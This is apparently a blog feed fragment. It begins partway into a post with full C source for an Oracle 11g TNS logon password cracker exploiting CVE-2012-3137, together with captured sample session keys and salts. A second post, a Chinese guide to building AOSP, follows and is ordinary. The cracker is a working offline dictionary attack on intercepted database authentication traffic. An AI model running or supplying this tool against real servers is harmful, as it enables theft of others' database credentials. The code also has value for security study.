class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/sha.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;getopt.h&quot;</span></span><br><br><br><span class="hljs-comment">//*********************************************************************************************************************</span><br><span class="hljs-comment">// Hashes captured on the network during authentication phase</span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123;  0x43,0xFD,0x38,0x02,0x93,0x77,0xC8,0x46,0x20,0xAE,0x18,0x51,0xFC,0x1D,0x23,0x14,0x09,0x98,0x50,0x64,0xDE,0xA0,0xD0,0xB8,0xD4,0x8E,0x50,0xE6,0x05,0x17,0x51,0xA5,0xD8,0xFD,0xFE,0xAA,0xA9,0xF8,0x3B,0x99,0xF3,0x7B,0x05,0x1F,0xA6,0x7F,0x85,0x46&#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY_C[] = &#123;  0xC7,0x24,0x8F,0x08,0x73,0xF0,0x4B,0x5A,0x02,0xE5,0x91,0x78,0x80,0x4B,0xD3,0x61,0xB0,0xC7,0x7B,0x20,0xA4,0xCF,0x68,0x54,0x60,0xDA,0x47,0x29,0x96,0xD5,0x24,0x57,0x45,0xA7,0x91,0xDF,0xEA,0x14,0x39,0x98,0x31,0xEC,0x62,0x38,0x08,0x08,0x90,0x3C&#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_PASSWORD [] = &#123;  0x8B,0x4C,0x7D,0x85,0xF4,0x21,0xEB,0xA0,0x59,0xFD,0xBA,0x21,0xF5,0x70,0x8F,0xD4,0xD3,0xBB,0x8A,0xB2,0x16,0x89,0x41,0x24,0x3B,0x5E,0xF0,0x76,0x81,0xF3,0xB8,0x0A &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x3D,0xA8,0xA3,0x09,0xD6,0x36,0xAC,0xF8,0x70,0x04 &#125;;</span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0x52,0xFC,0x04,0xB1,0xFF,0x81,0x10,0xCA,0x12,0x63,0xDF,0x5B,0xC6,0x1A,0x7E,0x57,0x74,0x0C,0x8A,0x51,0x11,0xD2,0x2B,0x41,0xE5,0x3C,0xC1,0x67,0xFD,0xF2,0xA6,0x87,0x89,0x58,0x20,0x0D,0x9B,0x2B,0x6A,0x51,0xC9,0x5D,0x77,0x9F,0xDE,0xBA,0xBB,0x69 &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY_C[] = &#123; 0xFA,0x6D,0xCD,0x0F,0x38,0x9E,0x92,0xD1,0x8F,0x81,0x88,0xEC,0x69,0x31,0x3B,0x52,0x4F,0x42,0x11,0x84,0xFA,0xE6,0x79,0x61,0x3A,0x72,0xFC,0x8D,0xFD,0x0A,0x4C,0x7B,0xB9,0x3A,0x6A,0xCB,0x8E,0x05,0xB8,0x25,0x8A,0x02,0x0D,0x29,0x54,0xEC,0x1B,0x63 &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_PASSWORD [] = &#123; 0x2C,0x5F,0x95,0x7A,0x65,0x32,0xAD,0x91,0xD9,0x16,0xF4,0xE5,0xFA,0x7D,0x2F,0xDA,0x0E,0x6C,0xDF,0xFB,0xAA,0xED,0x88,0x3C,0xAF,0x4F,0x20,0x0C,0x89,0x83,0xAE,0x3D &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x43,0xE0,0xBE,0x20,0xB3,0x2B,0x0B,0xB7,0x6E,0x57 &#125;;</span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0xED,0x91,0xB9,0x7A,0x04,0x00,0x0F,0x32,0x6F,0x17,0x43,0x0A,0x65,0xDA,0xCB,0x30,0xCD,0x1E,0xF7,0x88,0xE6,0xEC,0x31,0x07,0x42,0xB8,0x11,0xE3,0x21,0x12,0xC0,0xC9,0xCC,0x39,0x55,0x4C,0x9C,0x01,0xA0,0x90,0xCB,0x95,0xE9,0x5C,0x94,0x14,0x0C,0x28 &#125;; </span><br><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x7F,0xD5,0x2B,0xC8,0x0A,0xA5,0x83,0x66,0x95,0xD4 &#125;; </span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123;   0xBD,0x53,0x44,0x89,0x91,0xEE,0xAB,0x1E,0xCD,0x8D,0x32,0xFB,0x59,0x52,0x3F,0x0C,0xBD,0xB3,0x3B,0x40,0xC2,0x8F,0xEB,0xED,0xDD,0x5A,0xA3,0xA4,0xAF,0x0C,0xF6,0xB7,0x23,0x06,0x16,0x2D,0x3F,0x0C,0x1E,0x8D,0xB2,0x53,0x8A,0xF2,0x91,0xEC,0x01,0xA5&#125;;</span><br><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x03,0x1C,0xB4,0x72,0xC4,0xD9,0x04,0x12,0xDD,0x31 &#125;; </span><br><br><span class="hljs-comment">//*********************************************************************************************************************</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">HexStringtoBinArray</span><span class="hljs-params">(<span class="hljs-type">char</span>* str, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* <span class="hljs-built_in">array</span>)</span>&#123;<br>    <span class="hljs-type">int</span> alen=<span class="hljs-built_in">strlen</span>(str)/<span class="hljs-number">2</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> t[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hexc;<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(;i&lt;<span class="hljs-built_in">strlen</span>(str);i=i+<span class="hljs-number">2</span>)&#123;<br>        t[<span class="hljs-number">0</span>]=str[i];<br>        t[<span class="hljs-number">1</span>]=str[i+<span class="hljs-number">1</span>];<br>        hexc = t[<span class="hljs-number">0</span>]<span class="hljs-number">-48</span>;<br>        <span class="hljs-keyword">if</span> (hexc &gt; <span class="hljs-number">9</span>) hexc-=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">array</span>[j]=hexc*<span class="hljs-number">16</span>;<br>        hexc = t[<span class="hljs-number">1</span>]<span class="hljs-number">-48</span>;<br>        <span class="hljs-keyword">if</span> (hexc &gt; <span class="hljs-number">9</span>) hexc-=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">array</span>[j]+=hexc;<br>        j++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> j;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">hexdump</span><span class="hljs-params">( FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *title, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s,<span class="hljs-type">int</span> l)</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%s&quot;</span>, title);<br>    <span class="hljs-keyword">for</span> (; n &lt; l; ++n) &#123;<br>        <span class="hljs-keyword">if</span> ((n % <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n%04x&quot;</span>, n);<br>        &#125;<br>        <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot; %02x&quot;</span>, s[n]);<br>    &#125;<br><br>    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_MixCase_Hash</span> <span class="hljs-params">(<span class="hljs-type">char</span> *passwd, <span class="hljs-type">int</span> passwd_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> salt[<span class="hljs-number">10</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* oracle_mixcase_hash)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> to_hash[<span class="hljs-number">256</span>];<br>    SHA_CTX ctx;<br><br>    <span class="hljs-built_in">memcpy</span> (to_hash, passwd, passwd_len);<br>    <span class="hljs-built_in">memcpy</span> (to_hash+passwd_len, salt, <span class="hljs-number">10</span>);<br><br>    SHA1_Init (&amp;ctx);<br>    SHA1_Update (&amp;ctx, to_hash, passwd_len+<span class="hljs-number">10</span>);<br>    SHA1_Final (oracle_mixcase_hash, &amp;ctx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_TNS_Decrypt_AES192_CBC</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">int</span> input_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> iv[] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><br>    AES_KEY key;<br>    AES_set_decrypt_key(aes_key_bytes, <span class="hljs-number">192</span>, &amp;key);<br>    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_DECRYPT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_TNS_Encrypt_AES192_CBC</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">int</span> input_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> iv[] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><br>    AES_KEY key;<br>    AES_set_encrypt_key(aes_key_bytes, <span class="hljs-number">192</span>, &amp;key);<br>    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_ENCRYPT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usage</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;o5logoncrack -k server sesskey -s salt -d dict\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br><br>    <span class="hljs-type">char</span> password [<span class="hljs-number">100</span>];<br>    <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> dict_filename[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Oracle_MixCaseHash[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> decrypted_server_sesskey[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted_server_sesskey[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> AUTH_SESSKEY[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> AUTH_VFR_DATA[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">int</span> debug = <span class="hljs-number">0</span>;<br>    FILE * fp = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-type">int</span> ch;<br>    <span class="hljs-type">int</span> args = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>( ( ch = getopt( argc, argv, <span class="hljs-string">&quot;k:s:d:v&quot;</span> ) ) != EOF ) &#123;<br>        <span class="hljs-keyword">switch</span>(ch) &#123;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;k&#x27;</span>:<br>            HexStringtoBinArray(optarg, AUTH_SESSKEY);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            HexStringtoBinArray(optarg, AUTH_VFR_DATA);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>            <span class="hljs-built_in">strncpy</span>(dict_filename, optarg, <span class="hljs-number">255</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            debug = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>        args++;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (args &lt; <span class="hljs-number">3</span>) usage();<br><br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;*************************************************************\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Oracle 11g TNS AES-192 cracker by zz@nsfocus\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;*************************************************************\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ( (fp = fopen(dict_filename, <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span> ) &#123;<br>        perror(<span class="hljs-string">&quot;fail to read&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(fgets(password, <span class="hljs-number">100</span>, fp) != <span class="hljs-literal">NULL</span>) &#123;<br><br>        len = <span class="hljs-built_in">strlen</span>(password);<br>        <span class="hljs-keyword">if</span> (password[len<span class="hljs-number">-1</span>] == <span class="hljs-number">0xa</span> &amp;&amp; password[len<span class="hljs-number">-2</span>] == <span class="hljs-number">0xd</span>) &#123;<br>            password[len<span class="hljs-number">-2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> password[len<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;try `%s&#x27;\n&quot;</span>, password);<br>        <span class="hljs-comment">// Create Oracle Hash from the salt (AUTH_VFR_DATA) and the password</span><br>        ORACLE_MixCase_Hash (password, <span class="hljs-built_in">strlen</span> (password), AUTH_VFR_DATA, Oracle_MixCaseHash);<br><br>        <span class="hljs-built_in">memset</span> (aes_key_bytes,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(aes_key_bytes));<br>        <span class="hljs-built_in">memcpy</span> (aes_key_bytes,Oracle_MixCaseHash, <span class="hljs-number">20</span>);<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            hexdump(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;aes_key_bytes&quot;</span>, aes_key_bytes, <span class="hljs-keyword">sizeof</span>(aes_key_bytes));<br><br>        <span class="hljs-built_in">memset</span> (decrypted_server_sesskey, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(decrypted_server_sesskey));<br>        ORACLE_TNS_Decrypt_AES192_CBC (aes_key_bytes, AUTH_SESSKEY, <span class="hljs-number">48</span>, decrypted_server_sesskey);<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            hexdump(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;decrypted_server_sesskey&quot;</span>, decrypted_server_sesskey, <span class="hljs-keyword">sizeof</span>(decrypted_server_sesskey));<br><br>        ret = <span class="hljs-built_in">strncmp</span>(&amp;decrypted_server_sesskey[<span class="hljs-number">40</span>], <span class="hljs-string">&quot;\x08\x08\x08\x08\x08\x08\x08\x08&quot;</span>, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;\nFound password: %s \n\n&quot;</span>, password);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">memset</span>(password, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(password));<br><br>    &#125;<br><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012">http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012</a></li><li><a href="http://www.soonerorlater.hu/index.khtml?article_id=512">http://www.soonerorlater.hu/index.khtml?article_id=512</a></li><li><a href="http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol">http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol</a></li><li><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137</a></li><li><a href="http://www.openwall.com/lists/john-users/2012/09/28/1">http://www.openwall.com/lists/john-users/2012/09/28/1</a></li><li><a href="http://marcel.vandewaters.nl/oracle/security/password-hashes">http://marcel.vandewaters.nl/oracle/security/password-hashes</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–è¯‘ Android ç³»ç»Ÿæºç   ï¼ˆAOSPï¼‰</title>
    <link href="/cn/compile_android_source_code/"/>
    <url>/cn/compile_android_source_code/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-1-ä¸‹è½½æºç "><a href="#â˜†-1-ä¸‹è½½æºç " class="headerlink" title="â˜† 1. ä¸‹è½½æºç "></a>â˜† 1. ä¸‹è½½æºç </h2><p>ç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œå›½å†…è®¿é—® Android æºç ä¸å¤§æ–¹ä¾¿ï¼Œ æ¸…åå¤§å­¦åšäº†ä¸€ä»¶å¥½äº‹ï¼Œ å¼„äº†ä¸ª mirrorã€‚</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/</a></p><h3 id="ä¸‹è½½-repo"><a href="#ä¸‹è½½-repo" class="headerlink" title="ä¸‹è½½ repo"></a>ä¸‹è½½ repo</h3><p>Google è‡ªå·±æä¸€ä¸ªæºç åŒæ­¥å·¥å…·ï¼Œéœ€è¦ä¸‹ä¸‹è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> ~/bin<br>PATH=~/bin:<span class="hljs-variable">$PATH</span><br>curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo<br><span class="hljs-built_in">chmod</span> a+x ~/bin/repo<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤ï¼Œä¸‹è½½ repo  å¹¶å°† ~&#x2F;bin åŠ å…¥ PATH ç¯å¢ƒå˜é‡</p><h3 id="ä½¿ç”¨æ¯æœˆæ›´æ–°çš„åˆå§‹åŒ–åŒ…"><a href="#ä½¿ç”¨æ¯æœˆæ›´æ–°çš„åˆå§‹åŒ–åŒ…" class="headerlink" title="ä½¿ç”¨æ¯æœˆæ›´æ–°çš„åˆå§‹åŒ–åŒ…"></a>ä½¿ç”¨æ¯æœˆæ›´æ–°çš„åˆå§‹åŒ–åŒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar <span class="hljs-comment"># ä¸‹è½½åˆå§‹åŒ–åŒ…</span><br>tar xf aosp-latest.tar<br><span class="hljs-built_in">cd</span> AOSP   <span class="hljs-comment"># è§£å‹å¾—åˆ°çš„ AOSP å·¥ç¨‹ç›®å½•</span><br><span class="hljs-comment"># è¿™æ—¶ ls çš„è¯ä»€ä¹ˆä¹Ÿçœ‹ä¸åˆ°ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªéšè—çš„ .repo ç›®å½•</span><br>repo <span class="hljs-built_in">sync</span> <span class="hljs-comment"># æ­£å¸¸åŒæ­¥ä¸€éå³å¯å¾—åˆ°å®Œæ•´ç›®å½•</span><br><span class="hljs-comment"># æˆ– repo sync -l ä»…checkoutä»£ç </span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªåˆå§‹åŒ…çš„å¥½å¤„æŒºå¤šï¼Œåº”è¯¥å¯ä»¥å‡å°‘ä¸€äº›ç½‘ç»œ IO</p><h3 id="ç¼–è¯‘ç‰¹å®šç‰ˆæœ¬çš„-Android"><a href="#ç¼–è¯‘ç‰¹å®šç‰ˆæœ¬çš„-Android" class="headerlink" title="ç¼–è¯‘ç‰¹å®šç‰ˆæœ¬çš„ Android"></a>ç¼–è¯‘ç‰¹å®šç‰ˆæœ¬çš„ Android</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.0.1_r1<br>repo <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ç‰ˆæœ¬å·çš„å¯¹åº”å…³ç³»å¯ä»¥ä»è¿™ä¸ªé¡µé¢è·å¾—ï¼š</p><p><a href="https://source.android.com/setup/start/build-numbers">https://source.android.com/setup/start/build-numbers</a></p><h3 id="ä¸‹è½½å¯¹åº”è®¾å¤‡çš„-Driver-Binary"><a href="#ä¸‹è½½å¯¹åº”è®¾å¤‡çš„-Driver-Binary" class="headerlink" title="ä¸‹è½½å¯¹åº”è®¾å¤‡çš„ Driver Binary"></a>ä¸‹è½½å¯¹åº”è®¾å¤‡çš„ Driver Binary</h3><p>Pixel 2 å°±ç›´æ¥å¯ä»¥çœ‹è¿™ä¸ª <a href="https://developers.google.com/android/drivers#walleye">https://developers.google.com/android/drivers#walleye</a><br>ç›®å‰æœ€æ–°çš„ä¸¤ä¸ªé“¾æ¥ä¸ºï¼š</p><ul><li><a href="https://dl.google.com/dl/android/aosp/google_devices-walleye-pq2a.190305.002-78f45eb0.tgz">https://dl.google.com/dl/android/aosp/google_devices-walleye-pq2a.190305.002-78f45eb0.tgz</a></li><li><a href="https://dl.google.com/dl/android/aosp/qcom-walleye-pq2a.190305.002-a7c70412.tgz">https://dl.google.com/dl/android/aosp/qcom-walleye-pq2a.190305.002-a7c70412.tgz</a></li></ul><p>å°†è¿™ä¸¤ä¸ªæ–‡ä»¶åœ¨ aosp æ ¹ç›®å½•è§£å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxvf google_devices-walleye-pq2a.190305.002-78f45eb0.tgz<br>tar zxvf qcom-walleye-pq2a.190305.002-a7c70412.tgz<br></code></pre></td></tr></table></figure><p>å°†å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ <code>extract-google_devices-walleye.sh</code> å’Œ <code>extract-qcom-walleye.sh</code><br>è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸ºè‡ªè§£å‹æ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œå³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract-google_devices-walleye.sh<br>./extract-qcom-walleye.sh<br></code></pre></td></tr></table></figure><h2 id="â˜†-2-ç¼–è¯‘æºç "><a href="#â˜†-2-ç¼–è¯‘æºç " class="headerlink" title="â˜† 2. ç¼–è¯‘æºç "></a>â˜† 2. ç¼–è¯‘æºç </h2><p>åˆ‡æ¢åˆ° aosp æ ¹ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">make clobber<br><span class="hljs-built_in">source</span> build/envsetup.sh<br>lunch aosp_arm-eng<br>make -j4<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ lunch å¯ä»¥çœ‹åˆ°æ”¯æŒçš„å„ç§ buildï¼Œ è‡ªè¡Œé€‰æ‹©å³å¯ã€‚<br>ç¼–è¯‘æˆåŠŸåï¼Œå°†åœ¨ <code>out/target/product/walleye/</code> ç›®å½•ä¸‹ç”Ÿæˆé•œåƒæ–‡ä»¶ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices  <span class="hljs-number"> 33554432 </span>3æœˆ  <span class="hljs-number"> 8 </span>01:55 boot.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 8388608 </span>3æœˆ  <span class="hljs-number"> 7 </span>17:56 dtbo.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 1570048 </span>3æœˆ  <span class="hljs-number"> 8 </span>01:55 ramdisk.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 8721730 </span>3æœˆ  <span class="hljs-number"> 8 </span>01:55 ramdisk-recovery.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices<span class="hljs-number"> 1175523656 </span>3æœˆ  <span class="hljs-number"> 8 </span>02:17 system.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices  <span class="hljs-number"> 84722016 </span>3æœˆ  <span class="hljs-number"> 8 </span>02:15 system_other.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 4952764 </span>3æœˆ  <span class="hljs-number"> 8 </span>01:28 userdata.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices      <span class="hljs-number"> 4096 </span>3æœˆ  <span class="hljs-number"> 8 </span>02:17 vbmeta.img<br>-rw-r--r--<span class="hljs-number"> 1 </span>henices henices <span class="hljs-number"> 369635536 </span>3æœˆ  <span class="hljs-number"> 7 </span>16:42 vendor.img<br></code></pre></td></tr></table></figure><h2 id="â˜†-3-æ³¨æ„äº‹é¡¹"><a href="#â˜†-3-æ³¨æ„äº‹é¡¹" class="headerlink" title="â˜† 3. æ³¨æ„äº‹é¡¹"></a>â˜† 3. æ³¨æ„äº‹é¡¹</h2><p>æ¸…åè¿™ä¸ª mirror 